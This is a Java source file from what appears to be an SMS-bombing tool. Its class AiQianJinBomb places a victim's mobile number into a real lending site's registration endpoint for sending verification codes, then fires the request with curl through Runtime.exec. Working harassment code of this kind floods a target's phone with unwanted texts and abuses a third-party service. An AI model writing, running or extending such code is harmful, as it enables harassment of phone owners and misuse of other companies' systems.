package me.sms.service.bomb;

import com.sun.javafx.binding.StringFormatter;

import java.io.IOException;
import java.text.MessageFormat;

/**
 * Created by why on 11/19/2016.
 */
public class AiQianJinBomb extends AbstratBomb {

    String bomburl = "https://www.iqianjin.com/user/register/sendCodeByMobile?verifyCodeType=1&verifyPurpose=1&nickname=undefined&utmSource=20_196_123312&mobile={0}&_=1479522616338&wscckey=be6b321412e0b067_1479523213";

    @Override
    public void bomb(String mobile) {
        Object[] args = new Object[]{mobile};
        String url = MessageFormat.format(bomburl, args);
        logger.info("url:{}", url);
        try {
            Runtime.getRuntime().exec("curl " + url);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
